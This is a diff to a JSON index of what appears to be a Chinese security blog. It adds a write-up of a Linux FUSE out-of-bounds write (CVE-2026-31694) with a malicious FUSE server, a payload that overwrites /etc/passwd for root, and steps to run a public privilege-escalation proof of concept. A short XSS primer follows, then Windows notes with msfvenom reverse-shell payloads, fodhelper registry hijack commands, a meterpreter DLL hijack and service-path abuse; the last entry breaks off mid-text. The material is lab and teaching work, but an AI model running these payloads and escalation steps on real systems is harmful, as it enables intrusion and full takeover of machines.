@@ -24,6 +24,29 @@
       "article_body_text": "[CVE-2026-31694](https://www.cve.org/CVERecord?id=CVE-2026-31694)\n![](https://img.shields.io/static/v1?label=Product&message=Linux%20Kernel%20FUSE&color=blue) ![](https://img.shields.io/static/v1?label=Version&message=v4.20%20-%207.0&color=brightgreen) ![264](https://img.shields.io/static/v1?label=Vulnerability&message=CWE-787:%20Out-of-bounds%20Write&color=red)\n描述\nLinux 内核 FUSE 模块在处理 readdir 缓存时存在越界写漏洞（CVE-2026-31694），CVSS 3.1 评分 7.8（高危）。漏洞位于 `fs/fuse/readdir.c:fuse_add_dirent_to_cache()`，该函数仅检查目录项是否适合当前页面剩余空间，但从未校验目录项本身是否超过 PAGE_SIZE。恶意 FUSE 服务器返回 `namelen=4095` 的目录项，序列化后为 4120 字节，在 4KiB 页面系统上导致 `memcpy()` 越界溢出 24 字节到相邻内核页面。\n**攻击路径（任一即可触发）：**\n**路径 A：fusermount3（setuid root）** — 无需命名空间，Ubuntu/Fedora/Mint 等 GNOME 桌面发行版默认安装\n**路径 B：非特权用户命名空间** — `unshare -Ufirmp` → `CAP_SYS_ADMIN` → 直接挂载 FUSE，Debian/Arch/RHEL9/Fedora 默认启用\n**影响版本（可利用窗口）：**\nLinux Kernel 6.15+（`FUSE_NAME_MAX` 提升后），具体 NVD 范围：\n4.20 ~ < 6.6.136\n6.7 ~ < 6.12.84\n6.13 ~ < 6.18.25\n6.19 ~ < 7.0.2\n7.1-rc1, 7.1-rc2\n**实际可利用：仅 v6.15+**（`FUSE_NAME_MAX` 提升后 `namelen=4095` 才可达） **报告者：** Qi Tang 和 Zijun Hu；POC 由 0xCyberstan 独立发现并公开\nPOC\nReference\n[https://git.kernel.org/stable/c/51a8de6c50bf947c8f534cd73da4c8f0a13e7bed](https://git.kernel.org/stable/c/51a8de6c50bf947c8f534cd73da4c8f0a13e7bed) (修复补丁)\n[https://git.kernel.org/stable/c/474ce83c96a55f2eeb14dee2be375eeadfdacdf5](https://git.kernel.org/stable/c/474ce83c96a55f2eeb14dee2be375eeadfdacdf5)\n[https://git.kernel.org/stable/c/7de93abfaae1b2dc94da8a07a36421bd073f1d8f](https://git.kernel.org/stable/c/7de93abfaae1b2dc94da8a07a36421bd073f1d8f)\n[https://git.kernel.org/stable/c/45c05af36311624c1148123caeb011312495d86b](https://git.kernel.org/stable/c/45c05af36311624c1148123caeb011312495d86b)\n[https://git.kernel.org/stable/c/d23ad78bfd205eac26766e38ba7d79f279131098](https://git.kernel.org/stable/c/d23ad78bfd205eac26766e38ba7d79f279131098)\n[https://nvd.nist.gov/vuln/detail/CVE-2026-31694](https://nvd.nist.gov/vuln/detail/CVE-2026-31694)\n[https://cyberstan.co.uk/fuse-readdir-oob/](https://cyberstan.co.uk/fuse-readdir-oob/) (完整技术分析)\n[https://www.ipbuf.com/static/cve/2026/CVE-2026-31694_zh.html](https://www.ipbuf.com/static/cve/2026/CVE-2026-31694_zh.html\nGithub\n[https://github.com/0xCyberstan/CVE-2026-31694-POC](https://github.com/0xCyberstan/CVE-2026-31694-POC) (⭐8, MIT License) — 包含 Marker PoC + 本地提权利用\n漏洞复现步骤\n准备 Linux 6.15+ 内核的虚拟机（**仅在 VM 中运行，禁止在裸机运行**）\n获取内核源码树，编辑 `vm/config.sh` 设置 `KERNEL_TREE` 路径\n构建 Ubuntu 24.04 Guest 镜像：`sudo vm/make_rootfs.sh`\n构建漏洞内核：`vm/build_vuln_kernel.sh`\n一键运行：`vm/run_in_vm.sh`（启动 VM → 配置 → PoC → LPE → 验证 uid 0）\n核心 POC 代码\nPoC 较长，完整代码见于 [GitHub仓库](https://github.com/0xCyberstan/CVE-2026-31694-POC)\n**漏洞触发 — 恶意 FUSE 服务器核心逻辑（Python 版）：**\nimport os, stat  \nfrom fuse import FUSE, FuseOpcodes, Operations  \n​  \nclass MaliciousFuse(Operations):  \n    def getattr(self, path, fh=None):  \n        return {'st_mode': (stat.S_IFDIR | 0o755), 'st_nlink': 2}  \n​  \n    def readdir(self, path, fh):  \n        yield '.'  \n        yield '..'  \n        # namelen=4095 → 序列化4120字节 → 溢出24字节到相邻页面  \n        yield 'A' * 4095\n**漏洞触发 — 内核端越界写（C 版，简化）：**\n/* fuse_add_dirent_to_cache() 缺陷代码 */  \nreclen = FUSE_DIRENT_SIZE(dirent);  /* namelen=4095 → reclen=4120 */  \n​  \nif (offset + reclen > PAGE_SIZE) {  /* 仅检查剩余空间，不检查 reclen > PAGE_SIZE */  \n    index++; offset = 0;            /* 跳到新页面起始，但 4120 > 4096 */  \n}  \n​  \naddr = kmap_local_page(page[index]) + offset;  \nmemcpy(addr, dirent, reclen);       /* 越界！溢出24字节到相邻物理页面 */\n**LPE 攻击 — 24字节 payload 覆写 /etc/passwd：**\n/* 24字节 payload：将 root:x:0:0 改为 root::0:0（空密码字段） */  \nchar payload[24] = \"root::0:0:x:.:\\n#######\\n\";  \n/* '#' 吸收旧 root 行的截断残余，使 passwd 文件仍可正常解析 */\n**完整版使用方式：**\ngit clone https://github.com/0xCyberstan/CVE-2026-31694-POC.git  \ncd CVE-2026-31694-POC  \n\n# 编辑 vm/config.sh 设置 KERNEL_TREE  \nsudo vm/make_rootfs.sh  \nvm/build_vuln_kernel.sh  \nvm/run_in_vm.sh\n完整复现步骤\n\ncd /tmp\n\npoc获取\nuseradd -m -s /bin/bash test\nsu test\ngit clone https://github.com/0xCyberstan/CVE-2026-31694-POC.git\ncd CVE-2026-31694-POC\nmake\n\n\n内核准备\nwget https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.15.tar.xz\ntar -xf linux-6.15.tar.xz\n\n修改配置\nvim vm/config\n修改:KERNEL_TREE=\"/tmp/CVE-2026-31694-POC/linux-6.15\"\n\n环境准备\napt update\napt install -y qemu-system-x86 qemu-utils sshpass debootstrap gcc make\napt install -y flex bison libncurses-dev libssl-dev libelf-dev libdw-dev libc6-dev\n\n环境验证\nqemu-system-x86_64 --version\nqemu-img --version\nsshpass -V\ndebootstrap --version\ngcc --version\n\n判断是否支持KVM\negrep -c '(vmx|svm)' /proc/cpuinfo\n回显>0 支持\n回显==0 不支持\n\nchmod +x vm/*.sh\n./vm/make_rootfs.sh\n内核编译\n./vm/build_vuln_kernel.sh \n\n漏洞验证\n./vm/run_in_vm.sh\n\n./vm/make_rootfs.sh\n![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260709151639119.png)\n./vm/build_vuln_kernel.sh \n![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260709152906054.png)\n./vm/run_in_vm.sh\nssh -p 10022 test@127.0.0.1\n默认账号密码**test/test** **![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260709153820512.png)\n脚本解释\n**环境准备：** 编写恶意 FUSE 服务器，配置为在 `FUSE_INIT` 协商中声明 `max_pages > 1`（解锁 `name_max=4095`），并在 `READDIR` 回复中返回 `namelen=4095` 的超长目录项\n**挂载触发：** 通过 `fusermount3`（setuid）或非特权用户命名空间挂载恶意 FUSE 文件系统\n**内存布局准备（Grooming）：** 排空 Per-CPU Page (PCP) 空闲列表，迫使分配器回退到 buddy allocator 分割；构建相邻页面池；将 `/etc/passwd` 缓存页面精确放置到目标物理页面 (PFN+1)\n**触发溢出：** 内核处理 readdir 时调用 `fuse_add_dirent_to_cache()`，4120 字节 memcpy 溢出 24 字节到 `/etc/passwd` 的页缓存页面\n**提权：** 溢出的 24 字节将 `root:x:0:0:root:/root:/bin/bash` 改写为 `root::0:0:x:.:`（密码字段为空）；Ubuntu/Debian 默认 PAM `nullok` 允许空密码 `su root` → 获得 root shell\n**攻击原理：**\n`memcpy` 的 24 字节溢出通过直接映射（direct map）别名写入相邻物理页面，绕过所有内核安全检查\n页缓存是内核对文件数据的内存副本，所有读取进程共享同一缓存页\n溢出不经过 VFS 写路径，不标记页面为脏页，内核不知道页面被修改\n效果与 DirtyPipe (CVE-2022-0847) 相同：内存中的安全关键文件与磁盘版本不同，内核信任缓存版本\n**安全缓解措施失效原因：**\nAppArmor：Ubuntu 24.04 上 `fusermount3` 未受限；24.10+ 的 AppArmor profile 明确允许 FUSE 挂载\nSELinux：默认策略不限制非特权 FUSE 挂载\nseccomp：不应用于普通用户会话\nKASAN：页缓存来自页分配器而非 slab，无 slab 红区/ KASAN 检测\n**利用可靠性：** 1-10 次尝试内稳定获得 root，中位数约 3 次\n修复建议\n**升级内核：** 升级至已修复版本（6.6.136+, 6.12.84+, 6.18.25+, 7.0.2+）\n**临时缓解（无法立即升级时）：**\n通过 `/etc/fuse.conf` 限制非特权用户使用 FUSE\n移除 `fusermount3` 的 setuid 位（但会破坏 Snap/GVFS/SSHFS/无根容器等功能）\n禁用非特权用户命名空间（同样破坏合法功能）\n**修复代码：** 仅增加一行检查 `if (reclen > PAGE_SIZE) return;`，将隐式假设变为显式强制"
     },
     {
+      "slug": "1xss跨站",
+      "title": "XSS跨站",
+      "source_note": "F:\\hugo\\hzhsec.github.io\\drafts\\(1)、XSS跨站.md",
+      "summary": "➢ XSS跨站-输入输出-原理&分类&闭合 ➢ XSS跨站-分类测试-反射&存储&DOM 反射型xss攻击流程图 ![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/image%201.jpg) 储存型xss攻击流程图 ![](https://cdn.jsdmirror.com/gh/hzhsec/uplo",
+      "date_iso": "2026-07-23T10:00:00+08:00",
+      "word_count": 510,
+      "reading_minutes": 3,
+      "rel_permalink": "list/drafts/1xss跨站",
+      "section_path": [
+        "drafts"
+      ],
+      "categories": [
+        "基础漏洞"
+      ],
+      "tags": [
+        "xss"
+      ],
+      "featured": false,
+      "body_html": "<p>➢ XSS跨站-输入输出-原理&amp;分类&amp;闭合</p>\n<p>➢ XSS跨站-分类测试-反射&amp;存储&amp;DOM</p>\n<p>反射型xss攻击流程图 <img src=\"https://cdn.jsdmirror.com/gh/hzhsec/upload@main/image%201.jpg\" alt=\"image%201.jpg\"></p>\n<p>储存型xss攻击流程图 <img src=\"https://cdn.jsdmirror.com/gh/hzhsec/upload@main/image1.jpg\" alt=\"image1.jpg\"></p>\n<p>html dom树形结构 <img src=\"https://cdn.jsdmirror.com/gh/hzhsec/upload@main/image2%202.jpg\" alt=\"image2%202.jpg\"></p>\n<h1 id=\"xss跨站-输入输出-原理-分类-闭合\">XSS跨站-输入输出-原理-分类-闭合</h1>\n<p><strong>漏洞原理：</strong> 接受输入数据，输出显示数据后解析执行</p>\n<p><strong>基础类型：</strong> 反射(非持续)，存储(持续)，DOM-BASE</p>\n<p><strong>拓展类型：</strong> jquery，mxss，uxss，pdfxss，flashxss，上传xss等</p>\n<p><strong>常用标签</strong>：#https://www.freebuf.com/articles/web/340080.html</p>\n<p><strong>攻击利用：</strong> 盲打，COOKIE盗取，凭据窃取，页面劫持，网络钓鱼，权限维持等</p>\n<p><strong>安全修复：</strong> 字符过滤，实例化编码，http_only，CSP防护，WAF拦截等</p>\n<p><strong>测试流程：</strong> 看输出想输入在哪里，更改输入代码看执行（标签，过滤决定）</p>\n<h1 id=\"xss跨站-分类测试-反射-存储-dom\">XSS跨站-分类测试-反射-存储-DOM</h1>\n<p>-数据交互的地方</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">get、post、headers\n\n反馈与浏览\n富文本编辑器\n各类标签插入和自定义</code></pre></div>\n<p>-数据输出的地方</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">用户资料\n数据输出\n评论，留言等\n关键词、标签、说明</code></pre></div>\n<p><strong>文件上传</strong></p>\n<ul><li>反射型XSS：（某案例测试）</li></ul>\n<p>常见情况是攻击者通过构造一个恶意链接的形式，诱导用户传播和打开，</p>\n<p>由于链接内所携带的参数会回显于页面中或作为页面的处理数据源，最终造成XSS攻击。</p>\n<ul><li>存储型XSS：（某案例测试）</li></ul>\n<p>存储型XSS是持久化的XSS攻击方式，将恶意代码存储于服务器端，</p>\n<p>当其他用户再次访问页面时触发，造成XSS攻击。</p>\n<ul><li>DOM-base型XSS：（某案例测试）</li></ul>\n<p>通过修改原始的客户端代码，受害者浏览器的DOM环境改变，导致有效载荷的执行。</p>\n<p>页面本身没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面并执行</p>",
+      "toc_html": "<nav id=\"TableOfContents\"><ul><li class=\"toc-item toc-depth-1\"><a class=\"toc-link\" href=\"#xss跨站-输入输出-原理-分类-闭合\">XSS跨站-输入输出-原理-分类-闭合</a></li><li class=\"toc-item toc-depth-1\"><a class=\"toc-link\" href=\"#xss跨站-分类测试-反射-存储-dom\">XSS跨站-分类测试-反射-存储-DOM</a></li></ul></nav>",
+      "article_body_text": "➢ XSS跨站-输入输出-原理&分类&闭合\n➢ XSS跨站-分类测试-反射&存储&DOM\n反射型xss攻击流程图 ![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/image%201.jpg)\n储存型xss攻击流程图 ![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/image1.jpg)\nhtml dom树形结构 ![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/image2%202.jpg)\nXSS跨站-输入输出-原理-分类-闭合\n**漏洞原理：** 接受输入数据，输出显示数据后解析执行\n**基础类型：** 反射(非持续)，存储(持续)，DOM-BASE\n**拓展类型：** jquery，mxss，uxss，pdfxss，flashxss，上传xss等\n**常用标签**：#https://www.freebuf.com/articles/web/340080.html\n**攻击利用：** 盲打，COOKIE盗取，凭据窃取，页面劫持，网络钓鱼，权限维持等\n**安全修复：** 字符过滤，实例化编码，http_only，CSP防护，WAF拦截等\n**测试流程：** 看输出想输入在哪里，更改输入代码看执行（标签，过滤决定）\nXSS跨站-分类测试-反射-存储-DOM\n-数据交互的地方\nget、post、headers\n\n反馈与浏览\n富文本编辑器\n各类标签插入和自定义\n-数据输出的地方\n用户资料\n数据输出\n评论，留言等\n关键词、标签、说明\n**文件上传**\n反射型XSS：（某案例测试）\n常见情况是攻击者通过构造一个恶意链接的形式，诱导用户传播和打开，\n由于链接内所携带的参数会回显于页面中或作为页面的处理数据源，最终造成XSS攻击。\n存储型XSS：（某案例测试）\n存储型XSS是持久化的XSS攻击方式，将恶意代码存储于服务器端，\n当其他用户再次访问页面时触发，造成XSS攻击。\nDOM-base型XSS：（某案例测试）\n通过修改原始的客户端代码，受害者浏览器的DOM环境改变，导致有效载荷的执行。\n页面本身没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面并执行"
+    },
+    {
       "slug": "aicryptoproxy-ai-fu-neng-ni-xiang-web-jia-mi-liu-liang",
       "title": "AICryptoProxy：AI 赋能逆向Web 加密流量",
       "source_note": "F:\\hugo\\bak\\halo_to_publish\\工具使用\\aicryptoproxy-ai-fu-neng-ni-xiang-web-jia-mi-liu-liang.md",
@@ -443,6 +466,69 @@
       "body_html": "<p>&lt;!--more--&gt;</p>\n<h1 id=\"win系统提权-本地管理用户-uac绕过\">Win系统提权-本地管理用户-UAC绕过</h1>\n<h2 id=\"bypassuac自动提权\">BypassUAC自动提权</h2>\n<p><strong>什么是UAC?</strong></p>\n<p>UAC 就是 Windows 的“权限把控门”，普通程序过不去，只有经过用户确认才能执行高权限操作。</p>\n<p><strong>MSF模块</strong> 为了远程执行目标的exe或者bat可执行文件，需要绕过此安全机制。 在用户到系统权限自动提权中也可通过BypassUAC实现自动化提权。</p>\n<p>绕过项目：MSF内置，Powershell渗透框架，UACME项目(推荐) 开启UAC和未开启UAC时，CS/MSF默认getsystem提权影响（进程注入等）</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">\n./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f exe -o msf.exe\n\n# 生成 x64 可执行（staged meterpreter）\n\n./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.27.28.12 LPORT=3333 -f exe -o shell/evil_x64.exe\n\n# 或者生成 stageless（有时更稳定/绕 AV）\n\n./msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.27.28.12 LPORT=3333 -f exe -o shell/evil_x64_stageless.exe</code></pre></div>\n<p>MSF模块：</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">\nuse exploit/windows/local/ask\nuse exploit/windows/local/bypassuac\nuse exploit/windows/local/bypassuac_sluihijack\nuse exploit/windows/local/bypassuac_silentcleanup</code></pre></div>\n<p><strong>UACME</strong> UACME项目：<a href=\"https://github.com/hfiref0x/UACME\">https://github.com/hfiref0x/UACME</a> Akagi64.exe 编号 调用执行</p>\n<h3 id=\"其他\">其他</h3>\n<p><strong>注册表白名单绕过</strong></p>\n<ol><li>寻找不弹UAC框的程序</li></ol>\n<p>检测脚本：</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-python\" data-lang=\"python\">import os\nfrom subprocess import *\npath = &#x27;c:\\windows\\system32&#x27;\nfiles = os.listdir(path)\nprint(files)\ndef GetFileList(path, fileList):\n    newDir = path\n    if os.path.isfile(path):\n        if path[-4:] == &#x27;.exe&#x27;:\n            fileList.append(path)\n    elif os.path.isdir(path):\n        try:\n            for s in os.listdir(path):\n                newDir=os.path.join(path,s)\n                GetFileList(newDir, fileList)\n        except Exception as e:\n            pass\n    return fileList\nfiles = GetFileList(path, [])      \nprint(files)\nfor eachFile in files:\n    if eachFile[-4:] == &#x27;.exe&#x27;:\n        command = r&#x27;.\\sigcheck64.exe -m {} | findstr auto&#x27;.format(eachFile)\n        print(command)\n        p1 = Popen(command, shell=True, stdin=PIPE, stdout=PIPE)\n        if &#x27;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#x27; in p1.stdout.read().decode(&#x27;gb2312&#x27;):\n            copy_command = r&#x27;copy {} .\\success&#x27;.format(eachFile)\n            Popen(copy_command, shell=True, stdin=PIPE, stdout=PIPE)\n            print(&#x27;[+] {}&#x27;.format(eachFile))\n            with open(&#x27;success.txt&#x27;, &#x27;at&#x27;) as f:\n                f.writelines(&#x27;{}\\n&#x27;.format(eachFile))</code></pre></div>\n<ol><li>先在cmd运行测试是否弹UAC</li></ol>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-powershell\" data-lang=\"powershell\">c:\\windows\\system32\\bthudtask.exe                       ok\nc:\\windows\\system32\\changepk.exe\nc:\\windows\\system32\\ComputerDefaults.exe                ok      1\nc:\\windows\\system32\\dccw.exe                            ok      1\nc:\\windows\\system32\\dcomcnfg.exe                        ok      1\nc:\\windows\\system32\\DeviceEject.exe                     ok  \nc:\\windows\\system32\\DeviceProperties.exe                ok\nc:\\windows\\system32\\djoin.exe                           ok\nc:\\windows\\system32\\easinvoker.exe                      ok\nc:\\windows\\system32\\EASPolicyManagerBrokerHost.exe      ok\nc:\\windows\\system32\\eudcedit.exe                        ok      1\nc:\\windows\\system32\\eventvwr.exe                        ok      1\nc:\\windows\\system32\\fodhelper.exe                       ok      1\nc:\\windows\\system32\\fsquirt.exe                         ok      1\nc:\\windows\\system32\\FXSUNATD.exe                        ok\nc:\\windows\\system32\\immersivetpmvscmgrsvr.exe           ok\nc:\\windows\\system32\\iscsicli.exe                        ok      1\nc:\\windows\\system32\\iscsicpl.exe                        ok      1</code></pre></div>\n<ol><li>查询注册表Shell\\Open\\command键值对</li></ol>\n<p>通常以shell\\open\\command命名的键值对存储的是可执行文件路径，静默提升权限后即可运行该键值对程序。</p>\n<p>Procmon监听找到程序注册表信息，过滤 ![[6.jpg]] 会去查询 <code>HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command</code>，然后在注册表创建该键值对，从而绕过UAC</p>\n<p><strong>注册表劫持绕过</strong></p>\n<h4 id=\"fodhelperexe\">Fodhelper.exe</h4>\n<p>![[3240693-20230731221055025-1411728646.png]] 执行注册表写入：</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-cmd\" data-lang=\"cmd\">reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\Windows\\System32\\cmd.exe /f\nreg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 00000000 /f</code></pre></div>\n<p>不同位数cmd窗口可能显示不同，Fodhelper仅适用于Win10</p>\n<p>执行-x64：</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-cmd\" data-lang=\"cmd\">reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\Users\\huangzonghui\\Desktop\\1\\msf.exe /f\nreg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 00000000 /f</code></pre></div>\n<p>![[屏幕截图 2025-10-23 183641.png]] 反弹成功，执行getsystem提权</p>\n<hr>\n<h1 id=\"win系统提权-本地普通用户-dll劫持\">Win系统提权-本地普通用户-DLL劫持</h1>\n<h2 id=\"dll劫持提权应用配合msf-flashfxp\">DLL劫持提权应用配合MSF-FlashFXP</h2>\n<p>原理：Windows程序启动时需要DLL。如果DLL不存在，则可以在程序查找位置放置恶意DLL提权。搜索顺序：</p>\n<p>1、应用程序加载目录 2、C:\\Windows\\System32 3、C:\\Windows\\System 4、C:\\Windows 5、当前工作目录（CWD） 6、PATH环境变量目录（系统优先于用户）</p>\n<p>过程：信息收集 → 进程调试 → 制作dll并上传 → 替换dll → 等待应用启动</p>\n<p>检测：</p>\n<ol><li>ChkDllHijack</li><li>火绒剑</li><li>项目：<a href=\"https://github.com/anhkgg/anhkgg-tools\">https://github.com/anhkgg/anhkgg-tools</a></li></ol>\n<p>![[屏幕截图 2025-10-23 185636.png]]</p>\n<p>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</p>\n<p>生成DLL：</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f dll -o shell/libeay32.dll\nor\n./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f dll -o shell/ssleay32.dll</code></pre></div>\n<p>上传DLL：</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">meterpreter &gt; upload /usr/src/metasploit-framework/shell/libeay32.dll C:\\\\Users\\\\huangzonghui\\\\Desktop\\\\2\\\\FlashFXP</code></pre></div>\n<p>![[屏幕截图 2025-10-23 191425.png]] 执行成功上线 ![[屏幕截图 2025-10-23 191549.png]] 程序非正常 ![[屏幕截图 2025-10-23 191626.png]]</p>\n<hr>\n<h1 id=\"win系统提权-本地普通用户-未引号服务\">Win系统提权-本地普通用户-未引号服务</h1>\n<h2 id=\"不带引号服务路径配合msf-macroexpert\">不带引号服务路径配合MSF-MacroExpert</h2>\n<p>原理：服务路径配置由于目录空格问题，可上传恶意文件触发执行 过程：检测服务权限配置 → 制作文件并上传 → 更改服务路径 → 等待调用成功</p>\n<p>检测命令：</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\\Windows\\\\&quot; |findstr /i /v &quot;&quot;&quot;</code></pre></div>\n<p>![[屏幕截图 2025-10-23 191957.png]]</p>\n<p>上传反弹exe ![[屏幕截图 2025-10-23 193119.png]]</p>\n<p>设置执行名后，执行：</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">sc start &quot;Macro Expert&quot;</code></pre></div>\n<p>![[Pasted image 20251023193519.png]] 反弹成功 ![[屏幕截图 2025-10-23 193513.png]]</p>\n<hr>\n<h1 id=\"win系统提权-本地管理用户-不安全权限\">Win系统提权-本地管理用户-不安全权限</h1>\n<h2 id=\"不安全的服务权限配合msf-newservices\">不安全的服务权限配合MSF-NewServices</h2>\n<p>原理：即使正确引用服务路径，也可能存在其他漏洞。管理配置错误，用户可能对服务拥有过多权限，可直接修改导致重定向执行文件。</p>\n<p>过程：检测服务权限配置 → 制作文件并上传 → 更改服务路径 → 调用成功</p>\n<p>检测脚本：<a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk\">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">accesschk.exe -uwcqv &quot;huangzonghui&quot; * -accepteula\nsc config &quot;test&quot; binpath= &quot;C:\\Program.exe&quot;\nsc start test</code></pre></div>\n<hr>\n<h1 id=\"综合类检测项目\">综合类检测项目</h1>\n<p>PEAS-ng适用于Windows、Linux/Unix*和MacOS权限提升工具 项目：<a href=\"https://github.com/carlospolop/PEASS-ng\">https://github.com/carlospolop/PEASS-ng</a></p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">winPEAS.bat &gt; result.txt\nwinPEASany.exe log=result.txt</code></pre></div>\n<p>排查信息，获取有用权限数据 ![[屏幕截图 2025-10-23 195206.png]]</p>",
       "toc_html": "<nav id=\"TableOfContents\"><ul><li class=\"toc-item toc-depth-1\"><details class=\"toc-branch toc-depth-1\"><summary><a class=\"toc-link\" href=\"#win系统提权-本地管理用户-uac绕过\">Win系统提权-本地管理用户-UAC绕过</a></summary><div class=\"toc-children\"><ul><li class=\"toc-item toc-depth-2\"><details class=\"toc-branch toc-depth-2\"><summary><a class=\"toc-link\" href=\"#bypassuac自动提权\">BypassUAC自动提权</a></summary><div class=\"toc-children\"><ul><li class=\"toc-item toc-depth-3\"><a class=\"toc-link\" href=\"#其他\">其他</a></li></ul></div></details></li></ul></div></details></li><li class=\"toc-item toc-depth-1\"><details class=\"toc-branch toc-depth-1\"><summary><a class=\"toc-link\" href=\"#win系统提权-本地普通用户-dll劫持\">Win系统提权-本地普通用户-DLL劫持</a></summary><div class=\"toc-children\"><ul><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#dll劫持提权应用配合msf-flashfxp\">DLL劫持提权应用配合MSF-FlashFXP</a></li></ul></div></details></li><li class=\"toc-item toc-depth-1\"><details class=\"toc-branch toc-depth-1\"><summary><a class=\"toc-link\" href=\"#win系统提权-本地普通用户-未引号服务\">Win系统提权-本地普通用户-未引号服务</a></summary><div class=\"toc-children\"><ul><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#不带引号服务路径配合msf-macroexpert\">不带引号服务路径配合MSF-MacroExpert</a></li></ul></div></details></li><li class=\"toc-item toc-depth-1\"><details class=\"toc-branch toc-depth-1\"><summary><a class=\"toc-link\" href=\"#win系统提权-本地管理用户-不安全权限\">Win系统提权-本地管理用户-不安全权限</a></summary><div class=\"toc-children\"><ul><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#不安全的服务权限配合msf-newservices\">不安全的服务权限配合MSF-NewServices</a></li></ul></div></details></li><li class=\"toc-item toc-depth-1\"><a class=\"toc-link\" href=\"#综合类检测项目\">综合类检测项目</a></li></ul></nav>",
       "article_body_text": "<!--more-->\nWin系统提权-本地管理用户-UAC绕过\nBypassUAC自动提权\n**什么是UAC?**\nUAC 就是 Windows 的“权限把控门”，普通程序过不去，只有经过用户确认才能执行高权限操作。\n**MSF模块** 为了远程执行目标的exe或者bat可执行文件，需要绕过此安全机制。 在用户到系统权限自动提权中也可通过BypassUAC实现自动化提权。\n绕过项目：MSF内置，Powershell渗透框架，UACME项目(推荐) 开启UAC和未开启UAC时，CS/MSF默认getsystem提权影响（进程注入等）\n\n./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f exe -o msf.exe\n\n# 生成 x64 可执行（staged meterpreter）\n\n./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.27.28.12 LPORT=3333 -f exe -o shell/evil_x64.exe\n\n# 或者生成 stageless（有时更稳定/绕 AV）\n\n./msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.27.28.12 LPORT=3333 -f exe -o shell/evil_x64_stageless.exe\nMSF模块：\n\nuse exploit/windows/local/ask\nuse exploit/windows/local/bypassuac\nuse exploit/windows/local/bypassuac_sluihijack\nuse exploit/windows/local/bypassuac_silentcleanup\n**UACME** UACME项目：[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME) Akagi64.exe 编号 调用执行\n其他\n**注册表白名单绕过**\n寻找不弹UAC框的程序\n检测脚本：\nimport os\nfrom subprocess import *\npath = 'c:\\windows\\system32'\nfiles = os.listdir(path)\nprint(files)\ndef GetFileList(path, fileList):\n    newDir = path\n    if os.path.isfile(path):\n        if path[-4:] == '.exe':\n            fileList.append(path)\n    elif os.path.isdir(path):\n        try:\n            for s in os.listdir(path):\n                newDir=os.path.join(path,s)\n                GetFileList(newDir, fileList)\n        except Exception as e:\n            pass\n    return fileList\nfiles = GetFileList(path, [])      \nprint(files)\nfor eachFile in files:\n    if eachFile[-4:] == '.exe':\n        command = r'.\\sigcheck64.exe -m {} | findstr auto'.format(eachFile)\n        print(command)\n        p1 = Popen(command, shell=True, stdin=PIPE, stdout=PIPE)\n        if '<autoElevate>true</autoElevate>' in p1.stdout.read().decode('gb2312'):\n            copy_command = r'copy {} .\\success'.format(eachFile)\n            Popen(copy_command, shell=True, stdin=PIPE, stdout=PIPE)\n            print('[+] {}'.format(eachFile))\n            with open('success.txt', 'at') as f:\n                f.writelines('{}\\n'.format(eachFile))\n先在cmd运行测试是否弹UAC\nc:\\windows\\system32\\bthudtask.exe                       ok\nc:\\windows\\system32\\changepk.exe\nc:\\windows\\system32\\ComputerDefaults.exe                ok      1\nc:\\windows\\system32\\dccw.exe                            ok      1\nc:\\windows\\system32\\dcomcnfg.exe                        